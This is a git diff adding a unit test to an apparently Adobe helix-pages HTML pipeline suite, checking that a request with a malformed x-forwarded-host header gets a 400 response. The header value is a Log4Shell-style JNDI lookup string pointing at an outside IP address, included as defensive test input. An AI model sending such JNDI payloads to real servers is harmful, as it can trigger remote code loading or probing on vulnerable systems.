@@ -26,6 +26,30 @@ describe('Index Tests', () => {
     assert.strictEqual(resp.headers.get('x-error'), 'invalid path');
   });
 
+  it('responds with 400 for invalid xfh', async () => {
+    const resp = await htmlPipe(
+      new PipelineState({
+        log: console,
+        s3Loader: new FileS3Loader(),
+        owner: 'adobe',
+        repo: 'helix-pages',
+        ref: 'super-test',
+        partition: 'live',
+        path: '/',
+        contentBusId: 'foo-id',
+      }),
+      new PipelineRequest(new URL('https://www.hlx.live/'), {
+        headers: {
+          // eslint-disable-next-line no-template-curly-in-string
+          'x-forwarded-host': '${jndi:dns://3.238.15.214/ORTbVlfjTl}',
+        },
+      }),
+    );
+    assert.strictEqual(resp.status, 400);
+    // eslint-disable-next-line no-template-curly-in-string
+    assert.strictEqual(resp.headers.get('x-error'), 'invalid url: https://${jndi:dns://3.238.15.214/ORTbVlfjTl}/');
+  });
+
   it('responds with 500 for pipeline errors', async () => {
     /** @type htmlPipe */
     const { htmlPipe: mockPipe } = await esmock('../src/html-pipe.js', {
